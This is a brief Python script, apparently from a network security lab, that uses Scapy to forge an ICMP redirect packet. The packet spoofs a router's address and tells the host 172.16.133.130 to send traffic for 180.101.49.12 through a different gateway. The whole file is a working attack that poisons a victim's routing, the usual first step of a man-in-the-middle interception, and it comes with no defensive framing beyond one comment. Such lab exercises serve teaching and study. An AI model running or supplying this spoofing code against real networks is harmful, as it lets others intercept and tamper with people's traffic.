#!/usr/bin/python3
from scapy.all import *
ip = IP(src = "172.16.133.129", dst = "172.16.133.130")
icmp = ICMP(type=5, code=1) 
icmp.gw = "10.0.2.5"
# The enclosed IP packet should be the one that # triggers the redirect message.
ip2 = IP(src = "172.16.133.130", dst = "180.101.49.12")
send(ip/icmp/ip2/UDP());